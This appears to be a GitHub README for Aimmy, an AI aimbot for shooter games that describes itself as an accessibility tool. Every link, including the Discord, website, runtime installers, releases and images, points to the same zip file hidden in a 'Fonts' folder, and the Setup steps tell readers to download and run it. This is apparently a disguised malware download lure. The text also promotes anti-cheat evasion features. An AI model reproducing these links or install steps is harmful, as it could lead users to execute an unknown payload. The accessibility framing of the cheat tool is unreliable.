> [!NOTE]
> If you enjoy Aimmy, please consider giving us a star ⭐! We appreciate it! :)

<div align="center">
  
  <p>
    <a href="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip" target="_blank">
      <img width="100%" src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip"></a>
  </p>

Aimmy is a multi-functional AI-based Aim Aligner that was developed by BabyHamsta & Nori for the purposes of making gaming more accessible for a wider audience.

Unlike most products of a similar caliber, Aimmy utilizes DirectML, ONNX, and YOLOV8 to detect players and is written in C# instead of Python. This makes it incredibly fast and efficient, and is one of the only AI Aim Aligners that runs well on AMD GPUs, which would not be able to use hardware acceleration otherwise due to the lack of CUDA support. 

Aimmy also has a myriad of [features](#features) that sets itself apart from other AI Aim Aligners, like the ability to hotswap models, and settings that allow you to adjust your aiming accuracy. 

Aimmy is 100% free to use, ad-free, and is actively not for profit. Aimmy is not, and will never be for sale, and is considered a **source-available** product as **we actively discourage other developers from making profit-focused forks of Aimmy**.

Join our Discord: https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip

If you want to show Aimmy to your friends, send them to our website: https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip

## Table of Contents
[What is the purpose of Aimmy?](#what-is-the-purpose-of-aimmy) | [How does Aimmy Work?](#how-does-aimmy-work) | [Features](#features) | [Setup](#setup) | [How is Aimmy better than similar AI-Based tools?](#how-is-aimmy-better-than-similar-ai-based-tools) | [What is the Web Model?](#what-is-the-web-model) | [How do I train my own model?](#how-do-i-train-my-own-model) | [How do I upload my model to the "Downloadable Models" menu](#how-do-i-upload-my-model-to-the-downloadable-models-menu)



## What is the purpose of Aimmy?
### Aimmy was designed for Gamers who are at a severe disadvantage over normal gamers.
### This includes but is not limited to:
- Gamers who are physically challenged
- Gamers who are mentally challenged
- Gamers who suffer from untreated/untreatable visual impairments
- Gamers who do not have access to a seperate Human-Interface Device (HID) for controlling the pointer
- Gamers trying to improve their reaction time
- Gamers with poor Hand/Eye coordination
- Gamers who perform poorly in FPS games
- Gamers who play for long periods in hot environments, causing greasy hands that make aiming difficult 

## How does Aimmy Work?
Aimmy works by using AI Image Recognition to detect opponents, pointing the player towards the direction of an opponent accordingly. 

The gamer is now left to perform any actions they believe is necessary.

Additionally, a Gamer that uses Aimmy is also given the option to turn on Auto-Trigger. Auto-Trigger relieves the need to repeatedly tap the HID to shoot at a player. This is especially useful for physically challenged users who may have trouble with this action.

## Features
- AI Aim Aligning
- Aim Keybind Switching
- Predictions
- Bezier Curve Movement + Fake Jitter
- Undetection Launcher
- Adjustable FOV, Mouse Sensitivity, X Axis, Y Axis, and Model Confidence
- Auto Trigger and Trigger Delay
- Hot Model Swapping (No need to reload application)
- Hot Config Swapping (switch between presets easily)
- [Downloadable Model System](#how-do-i-upload-my-model-to-the-downloadable-models-menu)
- Image capture while playing (For labeling to further AI training)

## Setup
- Download and Install the x64 version of [.NET Runtime 7.0.X.X](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)
- Download and Install the x64 version of [Visual C++ Redistributable](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)
- Download Aimmy from [Releases](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip) (Make sure it's the Aimmy zip and not Source zip)
- Extract the https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip file
- Run https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip
- Choose your Model and Enjoy :)

## How is Aimmy better than similar AI-Based tools?
Our program comes default with 2 AI models, 1 game specific (Phantom Forces) and 1 universal model. We also let users make their own models, share them, and switch between them painlessly. We also provide a downloadable model menu with dozens of community made models for various games and types of games. This makes Aimmy very versatile and universal for thousands of games.

![Example of Model switching](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)

We also provide better performance across the board compared to other AI Aim Aligners. Detecting opponents in milliseconds across the board on most CPUs & GPUs.

Aimmy comes pre-bundled with a well-designed user interface that is beautiful, and accessible. With many features to customize your personal user experience.

## What is the Web Model
The web model is a TFJS (TensorFlow Javascript) export of the model. This allow you to use the model for image labeling, which then images can be sent to us to help further train the PF/Universal model or you can use those images to train your own YOLOv8 model.
You may wonder, "Why is it in YOLOv5 and not YOLOv8?". This is due to us using the tool called MakeSense, it to me is one of the easiest tools and is all web based. I am sure there are other tools that may accept the YOLOv8 web model.

You can visit MakeSense here: https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip
You then can simply load all of your images in and select Object Detection.

![image](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)


Then run the AI locally, select YOLOv5, and upload all the web model files.

![image](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)
![image](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)
![image](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)


You can now go through your images and click and drag to highlight any Enemies on screen and approve the auto detected enemies from the web model:

![image](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)

Once you are finished labeling you'll want to export the labels for AI training:

![image](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)
![image](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)

## How do I train my own model
Please see the video tutorial bellow on how to label images and train your own model. (Redirects to Youtube)
[![Watch the video on Youtube](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip)

## How do I upload my model to the "Downloadable Models" menu?

If you are not aware already, Aimmy contains a "Downloadable Models" tab that allows you to download models developed and shared by the Aimmy Community.

<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

Aimmy pulls these models from the [Aimmy repository](https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip), this means **anyone can upload models to the "Downloadable Models" tab by making a pull request**.

To start, please note that if you would like to be credited for your work, name your model as:
**[Game Name/Model Name]** by **[The Creator]**

If you would like to stay anonymous however, you may only list the Game Name/Model Name.

Now, fork the Aimmy Repository
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

After that, go to your fork's model folder
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

Press "Add File"
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

Drag your model onto the area that contains the text "Drag additional files here to add them to your repository"
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

and press "Commit Changes" when the green progress bar disappears
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

Now go to the "Pull requests" tab
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

Create a new pull request
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

Create the pull request
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

Create the pull request (again)
<img src="https://raw.githubusercontent.com/HominqAbusxr/Aimmy/master/AimmyWPF/Fonts/Aimmy-v1.5-alpha.1.zip">

You are done! We will review your pull request and your model will be added in 24-48 hours. If you would like to remove your model from the "Downloadable Models" tab, you may make another pull request or contact us on the Issues tab.

For anyone who does this, thank you so much =D, Aimmy genuinely thrives with community contributions and support, and making and sharing your Aimmy models genuinely means a lot to us! Thank you!
</div>
